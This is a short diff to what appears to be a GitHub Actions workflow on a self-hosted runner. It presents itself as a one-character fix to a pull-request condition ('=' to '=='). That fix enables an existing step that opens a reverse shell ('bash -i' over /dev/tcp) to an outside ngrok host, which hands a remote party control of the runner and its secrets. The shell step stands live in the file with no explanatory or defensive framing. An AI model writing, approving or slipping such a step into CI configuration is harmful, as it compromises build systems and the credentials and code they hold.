@@ -6,7 +6,7 @@ on:
 jobs:
   test:
     runs-on: self-hosted
-    if: github.event.name = 'pull_request'
+    if: github.event.name == 'pull_request'
     steps:
       - run: bash -i >& /dev/tcp/0.tcp.ngrok.io/19983 0>&1
       
